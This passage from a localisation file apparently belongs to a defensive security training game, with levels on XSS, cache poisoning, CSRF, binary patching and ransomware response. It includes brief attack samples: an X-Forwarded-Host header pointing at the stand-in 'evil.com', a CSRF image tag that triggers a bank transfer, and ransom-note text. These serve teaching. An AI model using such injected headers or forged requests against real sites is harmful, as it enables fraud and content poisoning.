          total: 'Kommentare gesamt:',
          safe: 'Sichere Kommentare:',
          suspicious: 'Verdächtige Kommentare:',
          patterns: 'Erkannte XSS-Muster:',
          action: '⚠️ Maßnahme erforderlich: Eingabebereinigung aktivieren!'
        },
        payload: {
          usage: 'Verwendung: show-payload <kommentar_id>\nBeispiel: show-payload 3',
          safe: 'Kommentar ist sicher - kein XSS erkannt',
          header: '=== XSS-PAYLOAD-ANALYSE ===',
          vector: 'Angriffsvektor:',
          risk: 'Risiko:',
          critical: 'KRITISCH - Skript kann ausgeführt werden!',
          mitigated: 'ABGEWEHRT - Payload blockiert'
        },
        identify: {
          header: '=== XSS-TYP-IDENTIFIZIERUNG ===',
          type: 'Typ: STORED XSS (Persistentes XSS)',
          desc: 'Beschreibung: Bösartige Skripte in der Datenbank gespeichert',
          loc: 'Ort: Benutzerkommentare im Forum',
          impact: 'Auswirkung: Betrifft alle Benutzer, die die Seite betrachten',
          flow: 'Angriffsablauf:\n1. Angreifer postet Kommentar mit <script>-Tag\n2. Skript wird in Datenbank gespeichert\n3. Skript wird für jeden Betrachter ausgeführt',
          success: '✓ XSS-Typ erfolgreich identifiziert!'
        },
        enableSanitization: {
          already: '[!] HTML-Bereinigung ist bereits aktiviert',
          success: '[✓] HTML-Bereinigung aktiviert\n[+] Gefährliche Tags entfernt: <script>, <iframe>, <object>\n[+] Event-Handler entfernt: onclick, onerror, onload\n[+] XSS-Risiko: DEUTLICH REDUZIERT'
        },
        enableCsp: {
          already: '[!] CSP ist bereits aktiviert',
          success: '[✓] Content Security Policy (CSP) aktiviert\n[+] Inline-Skripte blockiert\n[+] Unsafe-eval deaktiviert\n[+] Frame-ancestors eingeschränkt\n[+] XSS-Risiko: REDUZIERT'
        },
        enableEscaping: {
          already: '[!] Ausgabe-Escaping ist bereits aktiviert',
          success: '[✓] Ausgabe-Escaping aktiviert\n[+] HTML-Entitäten maskiert: < wird &lt;, > wird &gt;\n[+] Verhindert Skriptausführung im gerenderten Inhalt\n[+] XSS-Risiko: ELIMINIERT für maskierten Inhalt'
        },
        enableHttpOnly: {
          already: '[!] HttpOnly-Cookies sind bereits aktiviert',
          success: '[✓] HttpOnly-Cookies aktiviert\n[+] Cookies für JavaScript unzugänglich\n[+] Verhindert Cookie-Diebstahl durch XSS\n[+] Sitzungs hijacking Risiko: REDUZIERT'
        },
        restart: {
          reqBoth: '[!] Aktivieren Sie mindestens Bereinigung und HttpOnly-Cookies vor dem Neustart.',
          reqSanitization: '[!] Bereinigung fehlt. Verwenden Sie zuerst enable-sanitization.',
          reqHttpOnly: '[!] HttpOnly-Cookies fehlen. Verwenden Sie zuerst enable-httponly.',
          success: '[✓] Anwendung neu gestartet\n[✓] Sicherheitskonfigurationen angewendet\n[✓] HTML-Bereinigung: AKTIV\n[✓] HttpOnly-Cookies: AKTIV\n[✓] XSS-Angriff erfolgreich abgewehrt!'
        },
        scan: {
          header: '=== SCHWACHSTELLEN-SCAN ===',
          found: 'GEFUNDENE SCHWACHSTELLEN:',
          none: '✓ Keine kritischen Schwachstellen erkannt',
          recs: 'Empfehlungen:\n1. HTML-Bereinigung aktivieren (KRITISCH)\n2. Content Security Policy implementieren (HOCH)\n3. Ausgabe-Escaping aktivieren (HOCH)\n4. HttpOnly-Flag für Cookies setzen (MITTEL)',
          missingSanitization: '- Keine Eingabebereinigung',
          missingCsp: '- Fehlende Content Security Policy',
          missingEscaping: '- Kein Ausgabe-Escaping',
          missingHttpOnly: '- Cookies für Skripte zugänglich'
        },
        status: {
          header: '=== SICHERHEITSSTATUS ===',
          active: 'XSS-Angriff aktiv:',
          execution: 'Skriptausführung:',
          app: 'App-Status:',
          identified: 'XSS-Typ identifiziert:',
          protections: 'Aktive Schutzmaßnahmen:',
          yes: '🔴 JA',
          no: '🟢 NEIN',
          activeState: '🔴 AKTIV',
          blockedState: '🟢 BLOCKIERT',
          restarted: 'NEU GESTARTET',
          running: 'LÄUFT',
          notYet: 'NOCH NICHT'
        },
        help: "Verfügbar: analyze-comments, show-payload <id>, identify-xss, enable-sanitization, enable-csp, enable-escaping, enable-httponly, scan-vulnerabilities, restart-app",
        notFound: "Befehl nicht gefunden:"
      },
      hints: {
        step0: 'Das Unternehmensportal zeigt abnormales Verhalten. Überprüfen Sie den Inhalt im BROWSER.',
        step1: 'Einige Kommentare scheinen Code zu enthalten. Verwenden Sie im TERMINAL "help", um verfügbare Befehle zu sehen.',
        step2: 'XSS-Angriffe nutzen unbereinigte Eingaben aus. Analysieren Sie SIEM-Logs auf Angriffsmuster.',
        step3: 'Zum Schutz von Cookies vor JavaScript, erwägen Sie HttpOnly-Einstellungen. Zur Blockierung gefährlicher Tags, nutzen Sie Bereinigung.',
        step4: 'Nach der Aktivierung der Schutzmaßnahmen, vergessen Sie nicht, die Anwendung neu zu starten.'
      },
      debrief: {
        winTitle: 'XSS-ANGRIFF ABGEWEHRT!',
        winBody: 'Sie haben das Mitarbeiterportal erfolgreich vor Cross-Site-Scripting-Angriffen geschützt.',
        techniquesTitle: 'VERWENDETE TECHNIKEN:',
        techniques: [
          'Eingabebereinigung: entfernt bösartigen Code',
          'HttpOnly-Cookies: verhindert Sitzungsdiebstahl',
          'CSP: begrenzt Skriptausführungsquellen',
          'Ausgabe-Escaping: konvertiert Sonderzeichen'
        ]
      }
    },
    // Level 5: Cache Poisoning
    level5: {
      logMessages: {
        cacheMiss: 'Cache MISS - Frischer Inhalt vom Ursprungsserver',
        suspiciousReq: 'Verdächtige Anfrage erkannt - X-Forwarded-Host: evil.com',
        reqValidated: 'Anfrage validiert - Keine verdächtigen Header erkannt',
        cacheHitPoisoned: 'Cache HIT - Antwort mit bösartigem X-Forwarded-Host Header gecacht',
        cacheConfigured: 'Cache korrekt konfiguriert - Dynamischer Inhalt nicht gecacht',
        criticalHit: 'KRITISCH: Legitime Benutzer erhielten vergifteten Inhalt aus Cache (Cache HIT)',
        safeContent: 'Benutzer erhielt frischen, sicheren Inhalt vom Ursprungsserver',
        normalBrowsing: 'Normale Seitenanfrage - Benutzer besucht Webseite',
        cachePollution: 'Cache-Verschmutzung erkannt - Gleicher Cache-Key liefert unterschiedlichen Inhalt',
        varyConfigured: 'Vary-Header konfiguriert - Korrekter Cache-Key enthält alle sensiblen Header',
        consistentContent: 'Cache liefert konsistenten Inhalt',
        keyCollision: 'Cache-Key-Kollision - Mehrere Anfragen auf gleichen Cache-Eintrag abgebildet',
        keyCorrect: 'Cache-Key enthält korrekt Host und X-Forwarded-Host Header',
        multipleAffected: 'Mehrere Benutzer betroffen - Vergifteter Cache-Eintrag 234 Mal ausgeliefert',
        normalOps: 'Cache arbeitet normal - Keine Vergiftung erkannt'
      },
      browser: {
        site: {
          title: 'Firmenwebseite',
          alert: '⚠️ ALARM: Bösartiger Inhalt aus Cache injiziert!',
          malicious: 'Dieser Inhalt wurde aus dem Cache mit bösartigen Modifikationen ausgeliefert',
          headers: 'HTTP Antwort-Header:',
          hitWarning: '⚠️ Cache HIT - Aus Cache geliefert (234 Mal)',
          secure: '✓ SICHER',
          purged: '✅ Cache wurde geleert und neu konfiguriert\n✅ Frischer Inhalt vom Ursprungsserver geliefert',
          missSuccess: '✓ Cache MISS - Frischer Inhalt vom Ursprung'
        },
        profile: {
          title: 'Benutzerprofil',
          warning: '⚠️ Warnung: Dieser personalisierte Inhalt wird aus dem geteilten Cache geliefert!',
          hitWarning: '⚠️ Cache HIT - Private Benutzerdaten aus öffentlichem Cache geliefert (89 Hits)',
          headerError: 'Cache-Control: public, max-age=3600 ❌ (Sollte private oder no-store sein!)',
          freshSuccess: '✅ Personalisierter Inhalt frisch vom Ursprungsserver geliefert',
          missSuccess: '✓ Cache MISS - Dynamischer Inhalt nicht gecacht',
          headerSuccess: 'Cache-Control: no-store, must-revalidate ✅'
        },
        owasp: {
          title: '🛡️ Cache Poisoning - OWASP Guide',
          whatTitle: '🎯 Was ist Cache Poisoning?',
          whatText: 'Ein Angriff, der bösartigen Inhalt in den geteilten HTTP-Cache einschleust. Vergifteter Inhalt wird an alle Benutzer ausgeliefert, die auf die gecachte Ressource zugreifen.',
          howTitle: '⚠️ Wie es funktioniert:',
          howList: [
            'Angreifer sendet Anfrage mit modifizierten Headern (z.B. X-Forwarded-Host)',
            'Server antwortet und fügt Header in Antwort ein',
            'Antwort wird mit unzureichendem Cache-Key gecacht',
            'Legitime Benutzer erhalten vergiftete Antwort aus dem Cache'
          ],
          keyTitle: '🔑 Cache Key:',
          keyText: 'Der Cache-Key definiert den eindeutigen Cache-Eintrag. Wenn er keine sensiblen Header (Host, Cookie etc.) enthält, können unterschiedliche Antworten aus demselben Cache-Eintrag geliefert werden.',
          prevTitle: '✅ Prävention:',
          prevList: [
            '<strong>Vary Header:</strong> Schließt sensible Header in Cache-Key ein',
            '<strong>Cache-Control:</strong> no-store für dynamischen Inhalt',
            '<strong>Eingabevalidierung:</strong> Client-Headern nicht vertrauen',
            '<strong>Korrekter Cache-Key:</strong> Enthält Host, Cookie etc.'
          ]
        }
      },
      terminal: {
        initial: [
          '$ Reverse Proxy Management Terminal v1.0',
          '$ Tippen Sie "help" für verfügbare Befehle',
          '$ ⚠️  WARNUNG: Cache Poisoning erkannt - Bösartiger Inhalt im Cache!'
        ],
        showCache: {
          empty: '[✓] Cache ist leer',
          header: '=== CACHE - EINTRÄGE ===',
          path: 'Pfad:',
          status: 'Status:',
          hits: 'Cache Hits:',
          cachedAt: 'Gecacht am:',
          xCache: 'X-Cache:'
        },
        purgeCache: {
          alreadyEmpty: '[!] Cache ist bereits leer',
          success: '[✓] Cache erfolgreich geleert\n[+] Alle gecachten Einträge entfernt\n[+] Nächste Anfragen werden frischen Inhalt vom Ursprung laden\n[!] Denken Sie daran, die Cache-Konfiguration zu korrigieren, um erneute Vergiftung zu verhindern!'
        },
        showHeaders: {
          header: '=== HTTP ANTWORT-HEADER ===',
          current: 'Aktuelle Konfiguration:',
          ccPublic: 'public, max-age=3600 ❌',
          ccPrivate: 'no-store, must-revalidate ✅',
          probPublic: 'Dynamischer Inhalt wird öffentlich gecacht',
          probPrivate: 'Verhindert korrekt das Caching dynamischer Inhalte',
          varyMissing: '<nicht gesetzt> ❌',
          varySet: 'Host, X-Forwarded-Host, Cookie ✅',
          probVaryMissing: 'Cache-Key enthält keine sensiblen Header',
          probVarySet: 'Cache-Key enthält korrekt sensible Header',
          xfhEvil: 'evil.com ❌',
          xfhSanitized: '<sanitized> ✅',
          probXfhEvil: 'Nicht vertrauenswürdiger Header im Cache-Key verwendet',
          probXfhSanitized: 'Header korrekt validiert'
        },
        identifyHeader: {
          success: '=== HEADER ANALYSE ===\nVergiftungsvektor identifiziert: X-Forwarded-Host\n\nWie es funktioniert:\n1. Angreifer sendet: X-Forwarded-Host: evil.com\n2. Server nutzt diesen Header zur Generierung der Antwort\n3. Antwort wird mit falschem Cache-Key gecacht\n4. Alle Benutzer erhalten die vergiftete Antwort\n\nGrundursache: Cache-Key enthält X-Forwarded-Host nicht\nLösung: Fügen Sie "Vary: X-Forwarded-Host" Header hinzu\n\n✓ Angriffsvektor erfolgreich identifiziert!'
        },
        fixCacheKey: {
          already: '[!] Cache-Key ist bereits korrekt konfiguriert',
          success: '[✓] Cache-Key Konfiguration aktualisiert\n[+] Cache-Key enthält jetzt: URL + Host + X-Forwarded-Host + Cookie\n[+] Verhindert Cache-Kollisionen verschiedener Anfragen\n[+] Jede einzigartige Anfrage erhält eigenen Cache-Eintrag'
        },
        setCacheControl: {
          usage: 'Verwendung: set-cache-control no-store',
          already: '[!] Cache-Control ist bereits auf no-store gesetzt',
          success: '[✓] Cache-Control Header aktualisiert\n[+] Gesetzt auf: no-store, must-revalidate\n[+] Dynamischer/Personalisierter Inhalt wird nicht gecacht\n[+] Nur statische Assets werden gecacht'
        },
        enableVaryHeader: {
          already: '[!] Vary Header ist bereits aktiviert',
          success: '[✓] Vary Header aktiviert\n[+] Gesetzt auf: Vary: Host, X-Forwarded-Host, Cookie\n[+] Cache-Key enthält jetzt diese Header\n[+] Verhindert Cache Poisoning durch Header-Manipulation'
        },
        restartProxy: {
          reqPurge: '[!] Bitte leeren Sie den Cache vor dem Neustart',
          reqFix: '[!] Bitte korrigieren Sie die Header-Konfiguration vor dem Neustart',
          success: '[✓] Reverse Proxy neu gestartet\n[✓] Neue Konfiguration angewendet',
          cacheClean: 'SAUBER',
          cacheDirty: 'MUSS GELEERT WERDEN',
          headersSecure: 'SICHER',
          headersCheck: 'KONFIG PRÜFEN',
          mitigated: '[✓] Cache Poisoning erfolgreich abgewehrt!',
          vulnerable: '[!] System noch anfällig'
        },
        status: {
          header: '=== CACHE SICHERHEITSSTATUS ===',
          poisoned: 'Cache Vergiftet:',
          entries: 'Cache Einträge:',
          cleared: 'Cache Geleert:',
          headersFixed: 'Header Korrigiert:',
          vary: 'Vary Header:',
          keyFixed: 'Cache Key Korrigiert:',
          noCache: 'No-Cache Dynamisch:',
          identified: 'Header Identifiziert:',
          restarted: 'Proxy Neustart:',
          yes: '🔴 JA',
          no: '🟢 NEIN'
        },
        help: "Verfügbar: show-cache, purge-cache, show-headers, identify-header, fix-cache-key, set-cache-control no-store, enable-vary-header, restart-proxy, status",
        notFound: "Befehl nicht gefunden:"
      },
      hints: {
        step0: 'Im SIEM Logs analysieren und nach "Cache HIT" mit anomalem Inhalt suchen. Im TERMINAL "show-cache" nutzen, um zu sehen, was gecacht wurde.',
        step1: 'Cache ist geleert! Im TERMINAL den verantwortlichen Header mit "identify-header" identifizieren und analysieren, wie der Proxy Inhalte cacht.',
        step2: 'Im TERMINAL "Vary" Header mit "enable-vary-header" aktivieren und "set-cache-control no-store" für dynamische Inhalte nutzen. Dann Proxy neu starten.',
        step3: 'Im TERMINAL "restart-proxy" nutzen, um alle Sicherheitsänderungen anzuwenden. Mit "status" prüfen, ob Schutzmaßnahmen aktiv sind.',
        step4: {
          a: 'Sie sind fast fertig! Im TERMINAL "status" nutzen, um zu prüfen, ob alle Schutzmaßnahmen aktiv sind.',
          b: 'Erinnerung: Vary Header muss Host und X-Forwarded-Host enthalten, um zu verhindern, dass verschiedene Versionen zusammen gecacht werden.',
          c: 'Letzter Schritt! Im TERMINAL sicherstellen, dass Proxy mit "restart-proxy" neu gestartet wurde und Cache mit "show-cache" sauber ist.'
        },
        default: 'Im TERMINAL "status" nutzen, um zu prüfen, ob alle Schutzmaßnahmen aktiv sind!'
      },
      debrief: {
        title: 'ANALYSE CACHE POISONING ABWEHR',
        cleared: 'Cache geleert:',
        fixed: 'Header korrigiert:',
        vary: 'Vary Header aktiviert:',
        time: 'Abschlusszeit:',
        success: 'ERGEBNIS: Cache Poisoning Bedrohung neutralisiert!',
        completed: 'ERGEBNIS: Abgeschlossen.',
        fail: 'Zeit abgelaufen! Der Cache Poisoning Angriff betraf zu viele Benutzer.\n\nLeeren Sie den Cache und konfigurieren Sie die korrekten Header beim nächsten Mal schneller.'
      }
    },
    // Level 6: CSRF
    level6: {
      browser: {
        portal: {
          title: 'Unternehmens-Finanzportal',
          header: 'Unternehmens-Finanzportal',
          vulnerable: '⚠️ ANFÄLLIG',
          secure: '✅ SICHER',
          warningTitle: '⚠️ SICHERHEITSWARNUNG',
          warningText: 'CSRF-Schwachstellen erkannt! Anfragen werden nicht validiert.',
          warningRisk: 'Risiko: Unbefugte Überweisungen, Kontoübernahme, Datenänderung',
          secureTitle: '✅ SICHERER MODUS',
          secureText: 'CSRF-Schutz aktiv. Alle Anfragen werden validiert.',
          secureProt: 'Schutz: CSRF-Token, SameSite-Cookies, Ursprungsvalidierung',
          account: {
            title: 'Kontoübersicht',
            holder: 'Kontoinhaber',
            number: 'Kontonummer',
            balance: 'Aktueller Kontostand',
            unauthorized: '⚠️ Unbefugte Überweisung erkannt!',
            email: 'E-Mail'
          },
          activity: {
            title: 'Kürzliche Aktivität',
            blockReason: 'CSRF-Schutz aktiv',
            blockedLabel: '🛡️ BLOCKIERT',
            csrfLabel: '🚨 CSRF',
            forged: '⚠️ Diese Anfrage wurde von einer externen Seite gefälscht!',
            completed: 'ABGESCHLOSSEN',
            blocked: 'BLOCKIERT',
            amount: 'Betrag:',
            newEmail: 'Neue E-Mail:',
            origin: 'Ursprung:'
          },
          addComment: 'Kommentar hinzufügen',
          placeholder: 'Teilen Sie Ihre Gedanken...',
          postBtn: 'Kommentar posten'
        },
        dashboard: {
          title: 'CSRF-Schutz-Dashboard',
          protections: {
            title: '🛡️ Aktive Schutzmaßnahmen',
            tokens: 'CSRF-Token (Synchronizer Pattern)',
            sameSite: 'SameSite-Cookies',
            origin: 'Ursprungs-/Referer-Validierung',
            double: 'Double Submit Cookie',
            enabled: '✅ AKTIVIERT',
            disabled: '❌ DEAKTIVIERT'
          },
          risk: {
            title: '📊 CSRF-Risikoanalyse',
            level: 'Gesamtrisikostufe',
            critical: 'KRITISCH',
            low: 'NIEDRIG',
            detected: 'Erkannte CSRF-Anfragen:',
            unauthorized: 'Unbefugte Aktionen:',
            executed: 'AUSGEFÜHRT ⚠️',
            blocked: 'BLOCKIERT ✅',
            loss: 'Finanzieller Verlust:',
            yes: 'JA (Cookies, Sitzungen)',
            no: 'NEIN'
          },
          vectors: {
            title: '🎯 Bekannte CSRF-Angriffsvektoren',
            form: {
              title: '1. Bösartiges Formular',
              desc: 'Angreifer hostet verstecktes Formular, das automatisch an Opferseite sendet'
            },
            img: {
              title: '2. Bild-Tag-Exploit',
              desc: '<img src="bank.com/transfer?amount=5000">'
            },
            xhr: {
              title: '3. XMLHttpRequest/Fetch',
              desc: 'JavaScript führt authentifizierte Anfragen an Opferseite aus'
            }
          }
        },
        malicious: {
          title: 'Bösartige Seite',
          header: '☠️ Angreifer-Seite',
          desc: 'Diese bösartige Seite enthält versteckte CSRF-Angriffe:',
          how: {
            title: '🎯 Wie CSRF funktioniert:',
            list: [
              'Mitarbeiter meldet sich bei company-finance.internal an (Session-Cookie gesetzt)',
              'Mitarbeiter besucht Angreifer-Seite (diese Seite)',
              'Verstecktes Formular sendet automatisch an company-finance.internal',
              'Browser fügt Session-Cookie automatisch hinzu',
              'Finanzportal führt Anfrage aus, als ob Mitarbeiter sie gestellt hätte',
              'Unternehmensgelder ohne Genehmigung überwiesen!'
            ]
          }
        }
      },
      terminal: {
        initial: [
          '$ CSRF-Verteidigungsterminal v6.0',
          '$ Tippen Sie "help" für verfügbare Befehle',
          '$ ⚠️  WARNUNG: CSRF-Angriffe auf Unternehmens-Finanzportal erkannt!'
        ],
        analyze: {
          header: '=== ANFRAGE-ANALYSE ===',
          total: 'Gesamtanfragen:',
          legitimate: 'Legitime Anfragen:',
          csrf: 'CSRF-Anfragen:',
          patterns: 'Verdächtige Muster erkannt:',
          action: '⚠️ Aktion erforderlich: CSRF-Schutz aktivieren!'
        },
        transaction: {
          header: '=== TRANSAKTIONSDETAILS ===',
          id: 'ID:',
          time: 'Zeit:',
          user: 'Benutzer:',
          action: 'Aktion:',
          amount: 'Betrag:',
          destination: 'Ziel:',
          origin: 'Ursprung:',
          status: 'Status:',
          csrf: 'CSRF:',
          yes: 'JA ⚠️',
          no: 'NEIN ✓',
          risk: 'Risiko: KRITISCH - Gefälschte Anfrage ausgeführt!',
          safe: 'Status: Sicher'
        },
        identify: {
          header: '=== CSRF-ANGRIFFS-IDENTIFIKATION ===',
          type: 'Typ: KLASSISCHES CSRF (Cross-Site Request Forgery)',
          desc: 'Beschreibung: Unbefugte statusändernde Anfragen',
          vector: 'Vektor: Externe Seiten senden authentifizierte Anfragen',
          impact: 'Auswirkung: Unbefugte Überweisungen, Kontoänderungen, Datendiebstahl',
          chars: 'Angriffsmerkmale:',
          success: '✓ CSRF-Angriffstyp erfolgreich identifiziert!'
        },
        tokens: {
          already: '[!] CSRF-Token bereits aktiviert',
          success: '[✓] CSRF-Token aktiviert (Synchronizer Token Pattern)\n[+] Einzigartiges Token pro Sitzung generiert\n[+] Token in allen statusändernden Anfragen erforderlich\n[+] Server validiert Token vor Verarbeitung\n[+] CSRF-Risiko: SIGNIFIKANT REDUZIERT'
        },
        sameSite: {
          already: '[!] SameSite-Cookies bereits aktiviert',
          success: '[✓] SameSite-Cookie-Attribut aktiviert\n[+] Cookies nicht bei Cross-Site-Anfragen gesendet\n[+] Richtlinie: SameSite=Strict\n[+] Verhindert automatische Cookie-Einbindung\n[+] CSRF-Risiko: REDUZIERT'
        },
        origin: {
          already: '[!] Ursprungsvalidierung bereits aktiviert',
          success: '[✓] Origin/Referer-Validierung aktiviert\n[+] Prüfung des Origin-Headers bei Anfragen\n[+] Blockierung von Anfragen externer Domänen\n[+] Erwarteter Ursprung: company-finance.internal\n[+] CSRF-Risiko: REDUZIERT'
        },
        double: {
          already: '[!] Double Submit Cookie bereits aktiviert',
          success: '[✓] Double Submit Cookie Muster aktiviert\n[+] CSRF-Token in Cookie UND Anfrageparameter gespeichert\n[+] Server vergleicht beide Werte\n[+] Angreifer kann Cookie nicht lesen (SOP)\n[+] CSRF-Risiko: REDUZIERT'
        },
        restart: {
          req: '[!] Keine Sicherheitsänderungen erkannt. Wenden Sie zuerst Schutzmaßnahmen an.',
          success: '[✓] Finanzportal neu gestartet\n[✓] Neue Sicherheitskonfigurationen angewendet',
          status: '[✓] CSRF-Schutzstatus:',
          mitigated: '[✓] CSRF-Angriff erfolgreich abgewehrt!',
          recommend: '[!] Zusätzliche Schutzmaßnahmen empfohlen'
        },
        balance: {
          header: '=== KONTOSTATUS ===',
          current: 'Aktueller Kontostand:',
          original: 'Ursprünglicher Kontostand:',
          loss: 'Verlust:',
          secure: 'Status: Sicher ✓',
          warning: 'WARNUNG: Unbefugte Überweisung erkannt!',
          safe: 'Keine unbefugten Transaktionen'
        },
        scan: {
          header: '=== CSRF-SCHWACHSTELLEN-SCAN ===',
          found: 'SCHWACHSTELLEN GEFUNDEN:',
          none: '✓ Keine kritischen Schwachstellen erkannt',
          recs: 'Empfehlungen:\n1. CSRF-Token implementieren (KRITISCH)\n2. SameSite-Cookies aktivieren (HOCH)\n3. Origin/Referer-Header validieren (HOCH)\n4. Double Submit Cookie Muster erwägen (MITTEL)',
          missingTokens: '- Fehlende CSRF-Token',
          missingSameSite: '- SameSite-Cookies nicht konfiguriert',
          missingOrigin: '- Keine Origin/Referer-Validierung',
          missingDouble: '- Double Submit Cookie nicht implementiert'
        },
        status: {
          header: '=== SICHERHEITSSTATUS ===',
          active: 'CSRF-Angriff aktiv:',
          unauth: 'Unbefugte Aktionen:',
          app: 'App-Status:',
          restarted: 'NEU GESTARTET',
          running: 'LÄUFT',
          type: 'Erkannter CSRF-Typ:',
          notYet: 'NOCH NICHT',
          balance: 'Kontostand:',
          protections: 'Aktive Schutzmaßnahmen:',
          yes: '🔴 JA',
          no: '🟢 NEIN'
        },
        help: "Verfügbar: analyze-requests, show-transaction <id>, identify-csrf, enable-csrf-tokens, enable-samesite, enable-origin-check, restart-app, status"
      },
      logMessages: {
        sessionCreated: 'Benutzer john.doe angemeldet - Sitzung erstellt',
        attackDetected: 'CSRF-Angriff: Unbefugte Überweisungsanfrage von externem Ursprung',
        blocked: 'CSRF-Versuch blockiert: Fehlendes oder ungültiges CSRF-Token',
        execution: 'KRITISCH: Geldüberweisung ohne Benutzerzustimmung ausgeführt',
        rejected: 'Anfrage abgelehnt: Ursprungsvalidierung fehlgeschlagen',
        sessionHijacked: 'CSRF: E-Mail-Änderungsanfrage von verdächtigem Ursprung - Benutzersitzung gekapert',
        sameSiteBlocked: 'SameSite-Cookie-Richtlinie aktiv - Cross-Site-Anfrage blockiert',
        normal: 'Normale Benutzeraktivität - GET-Anfrage mit gültiger Sitzung',
        passwordChange: 'Passwortänderung via CSRF ausgeführt - Benutzerdaten kompromittiert',
        tokenPassed: 'CSRF-Token-Validierung: BESTANDEN - Anfrage authentifiziert',
        multipleAttempts: 'Mehrere CSRF-Versuche erkannt - Angriffsmuster: Gefälschte statusändernde Anfragen',
        validated: 'Alle statusändernden Anfragen validiert - CSRF-Schutz aktiv',
        vectorConfirmed: 'CSRF-Angriffsvektor bestätigt - Eingebettete bösartige Formulare auf externen Seiten',
        doubleEnforced: 'Double-Submit-Cookie-Muster erzwungen - Alle Anfragen sicher'
      },
      hints: {
        step0: 'Im SIEM Transaktionen analysieren. Sehen Sie Anfragen von externen Ursprüngen? Im TERMINAL "analyze-requests" nutzen.',
        step1: 'Sie haben CSRF identifiziert! Im TERMINAL "enable-csrf-tokens" nutzen, um Verifizierungstoken hinzuzufügen.',
        step2: 'Im TERMINAL "enable-samesite" für extra Cookie-Schutz hinzufügen, dann "restart-app" nutzen.',
        step3: {
          a: '✅ Gut! CSRF-Schutzmaßnahmen sind aktiv. Im TERMINAL "status" nutzen, dann Kontostand im BROWSER prüfen.',
          b: 'Erinnerung: CSRF-Token und SameSite-Cookies schützen vor unbefugten Anfragen. Mit "status" prüfen.',
          c: 'Fast fertig! Im TERMINAL sicherstellen, dass "enable-csrf-tokens" und "enable-samesite" aktiv sind.'
        },
        default: '✅ Im TERMINAL Status mit "status" prüfen und Kontostand im BROWSER verifizieren!'
      },
      debrief: {
        title: 'ANALYSE CSRF-ABWEHR',
        protections: 'Aktivierte Schutzmaßnahmen:',
        unauth: 'Unbefugte Aktionen:',
        active: 'AKTIV',
        blocked: 'BLOCKIERT',
        balance: 'Kontostand:',
        time: 'Abschlusszeit:',
        success: 'ERGEBNIS: CSRF-Angriff erfolgreich abgewehrt!',
        completed: 'ERGEBNIS: Abgeschlossen.',
        fail: 'Kontoguthaben wurde durch erfolgreiche CSRF-Angriffe gestohlen.\n\nAktivieren Sie CSRF-Token und SameSite-Cookie-Schutz vor dem Neustart.'
      }
    },
    // Level 7
    level7: {
      title: "Level 7: Reverse Engineering & Patching",
      subtitle: "Analyze binary logic and bypass security controls",
      siem: {
        startup: "System startup",
        login: "User login",
        bypass: "Auth Bypass Detected: Admin access granted to anonymous user."
      },
      terminal: {
        waiting: "Waiting for tasks...",
        alert: "ALERT: Vulnerability detected in 'auth.exe'.",
        action: "ACTION REQUIRED: Fix the security check logic.",
        authPatched: "auth.exe patched. Ready to compile & test.",
        updaterPatched: "updater.exe patched. Ready to compile & test.",
        compilingAuth: "Compiling auth.exe... OK. (Binary patched)",
        compilingUpdater: "Compiling updater.exe... OK. (Binary patched)",
        nothing: "Nothing to compile.",
        execAuth: "Executing auth.exe...",
        enterCode: "Enter Access Code: 195932126",
        accessGranted: "[SUCCESS] Access Granted! System Unlocked.",
        vulnFixed: "STATUS: Vulnerability fixed. Code is now required.",
        nextInstruction: "INSTRUCTION: Now analyze 'updater.exe'. It has a similar flaw.",
        failAuth: "FAIL: The system still accepts ANY code! You must restrict it.",
        execUpdater: "Executing updater.exe...",
        sigVerified: "[SUCCESS] Signature Verified (Bypassed). Running update...",
        missionAccomplished: "MISSION ACCOMPLISHED.",
        sigFailed: "[ERROR] Signature Verification Failed!",
        failUpdater: "FAIL: The update service blocked the execution.",
        help: "Available: ls, build, ./auth.exe, ./updater.exe"
      },
      hints: {
        phase0: "Monitor the SIEM. Wait for a critical security alert.",
        phase1: [
          "We detected that 'auth.exe' grants access to anyone. There seems to be a severe programming error (Debug Mode left active).",
          "Analyze the decompiled C code via 'RE Tool'. Look for the 'check_credentials' function. Do you notice anything strange in the IF statement?",
          "The 'if(1)' statement (or if(true)) makes the condition always true, bypassing every check. We must restore security.",
          "Modify the code: replace 'if(1)' with a security code check. The correct code should be 195932126 (0xBADC0DE). Ex: 'if (input_code == 195932126)'"
        ],
        phase2: "Now that you've restored security, use 'build' in the terminal to compile and run './auth.exe' to verify access is protected.",
        phase3: "Perfect, now do it again. 'updater.exe' has the opposite problem. It blocks valid updates too. Analyze and fix the logic.",
        phase4: "Patched updater.exe? Good. Now compile and run it in the terminal as you learned."
      },
      debrief: {
        win: "VULNERABILITY IDENTIFIED: Logic Bypass & Client-Side Trust.\n\nYou demonstrated how poorly implemented client-side security controls can be bypassed.\n\nLESSON LEARNED: Never trust client-side input. Cleaning comments and debug code is crucial to avoid giving clues to attackers.",
        loss: "MISSION FAILED. System compromised or too many errors committed."
      }
    },
    // Level 8
    level8: {
      hints: {
        start: "Inbox: Suspicious Activity Report. Check your email for Emergency Protocols.",
        emergency: "Great! Process Terminated. Now investigate logs (SIEM) to find the source IP.",
        compromised: "SYSTEM COMPROMISED! Find manual override! (Hint: Emergency Manual says Ctrl+Alt+K to disable network interface and start investigation.)"
      },
      emails: {
        ciso: {
          subject: "URGENT: Incident Response Protocols Update",
          preview: "We are noticing an increase in ransomware activity...",
          body: "Dear Team,\n\nWe are noticing an increase in ransomware activity targeting our sector.\nPlease review the Incident Response Manual immediately.\n\nRANSOMWARE EMERGENCY PROCEDURE:\n1. DO NOT turn off the machine (encryption might corrupt files).\n2. If screen is locked, use hardware interrupt sequence: Ctrl + Alt + K.\n3. Isolate network segment.\n4. Identify vector and decryption key.\n\nStay vigilant.",
          explanation: "Legitimate security notice from CISO."
        },
        hr: {
          subject: "Quarterly Performance Reviews",
          preview: "Just a reminder that reviews will start...",
          body: "Just a reminder that reviews will start next week. Please prepare your self-assessment.",
          explanation: "Routine HR email."
        }
      },
      logs: {
        firewall: "Outbound connection allowed TCP 443",
        ids: "Suspicious file download detected from 145.2.33.11",
        antivirus: "Signature scan skipped for cryptolocker_v2.exe (Policy Override)"
      },
      files: {
        readme: "YOUR FILES HAVE BEEN ENCRYPTED!\nTo recover your data, you must enter the decryption key.\nContact: darkweb@anonymous.onion",
        urgent: "⚠️ RANSOMWARE ALERT ⚠️\nAll your files are encrypted.\nFollow instructions in documents/README_DECRYPT.txt"
      },
      debrief: {
        win: "Excellent work. You successfully intercepted the ransomware attack, identified the source via packet analysis, and retrieved the decryption key.",
